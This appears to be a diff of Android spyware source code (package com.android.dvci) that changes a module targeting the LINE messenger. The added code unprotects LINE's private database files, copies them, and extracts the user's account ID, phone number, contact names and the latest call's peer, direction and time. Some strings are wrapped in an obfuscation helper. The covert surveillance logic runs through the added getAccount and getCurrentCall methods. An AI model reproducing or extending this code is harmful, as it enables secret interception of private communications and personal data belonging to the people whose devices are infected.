@@ -8,6 +8,7 @@ import com.android.dvci.db.RecordHashPairVisitor;
 import com.android.dvci.db.RecordStringVisitor;
 import com.android.dvci.db.RecordVisitor;
 import com.android.dvci.file.Path;
+import com.android.dvci.module.call.CallInfo;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.mm.M;
@@ -28,10 +29,10 @@ public class ChatLine extends SubModuleChat {
     Semaphore readChatSemaphore = new Semaphore(1, true);
     private Date lastTimestamp;
     private long lastLine;
-    private String account = "";
-    private String account_mid = M.e("mid");
+    private static String account = "";
+    private static String account_mid = M.e("mid");
 
-    private GenericSqliteHelper helper;
+    private static GenericSqliteHelper helper;
 
     @Override
     public int getProgramId() {
@@ -98,6 +99,7 @@ public class ChatLine extends SubModuleChat {
 					}
 					markup.serialize(lastmessage);
 				}
+				getCurrentCall(new CallInfo(false));
 			}finally {
 				helper.disposeDb();
 			}
@@ -112,7 +114,7 @@ public class ChatLine extends SubModuleChat {
 
     }
 
-    private String readMyPhoneNumber(List<String> mymids) {
+    static public String readMyPhoneNumber(List<String> mymids) {
 
         RecordHashPairVisitor visitorContacts = new RecordHashPairVisitor("m_id", "name");
         helper.traverseRecords(M.e("contacts"), visitorContacts);
@@ -165,7 +167,97 @@ public class ChatLine extends SubModuleChat {
         }
     }
 
-    private long readLineMessageHistory() throws IOException {
+	public static String getAccount() {
+		String dbAccountFile_local = M.e("/data/data/jp.naver.line.android/databases/naver_line_myhome-journal");
+		if(account.equals("")){
+
+			Path.unprotect(dbAccountFile_local, 3, true);
+			helper = GenericSqliteHelper.openCopy(dbAccountFile_local);
+			if (helper == null) {
+				return null;
+			}
+			List<String> mymids= new ArrayList<String>();
+			try {
+				RecordStringVisitor visitor = new RecordStringVisitor("mid");
+				helper.traverseRecords("my_home_status", visitor);
+
+				mymids = visitor.getRecords();
+			}finally{
+				helper.disposeDb();
+			}
+			try {
+				account = readMyPhoneNumber(mymids);
+			}finally{
+				helper.disposeDb();
+			}
+		}
+		return account;
+	}
+
+	static public boolean getCurrentCall(final CallInfo call) {
+		String dbFile_local = M.e("/data/data/jp.naver.line.android/databases/naver_line");
+		/* just a test to check the evidence on console
+		call.id= 0;
+
+		call.timestamp = new Date();
+		call.peer = "other";
+		call.incoming = false;
+		call.account = "my";
+		call.valid = true;
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (getCurrentCall) user: " + call.account + " peer: " + call.peer + " timestamp:" + new Date());
+		}
+		return true;
+		*/
+
+		try {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall) unprotecting: " + dbFile_local);
+			}
+			Path.unprotect(dbFile_local, 3, true);
+            Path.unprotect(dbFile_local + "*", true);
+			String sqlquery = M.e("select m.id,m.chat_id,m.from_mid,m.created_time,c.name from chat_history as m join contacts as c on m.chat_id = c.m_id " +
+					"where m.type = 4 and m.created_time > 0 order by m.created_time desc limit 1");
+
+			RecordVisitor visitor = new RecordVisitor() {
+				@Override
+				public long cursor(Cursor cursor) {
+					call.id= cursor.getInt(0);
+					String from_mid = cursor.getString(2);
+					long created_time = cursor.getLong(3);
+					call.timestamp = new Date(created_time);
+					call.peer = cursor.getString(4);
+					call.incoming = from_mid != null;
+					call.account = account;
+					call.valid = true;
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getCurrentCall) user: " + call.account + " peer: " + call.peer + " timestamp:" + created_time);
+					}
+					return call.id;
+				}
+			};
+			if(helper == null){
+				helper = GenericSqliteHelper.openCopy(dbFile_local);
+				if (helper == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (getCurrentCall) Error, file not readable: " + dbFile_local);
+					}
+					return false;
+				}
+			}
+			helper.traverseRawQuery(sqlquery, new String[]{}, visitor);
+			return call.valid;
+
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+
+				Check.log(TAG + " (getCurrentCall) Error: ", ex);
+			}
+		}
+		return false;
+
+	}
+	private long readLineMessageHistory() throws IOException {
 
         try {
             Path.unprotect(dbFile, 3, true);
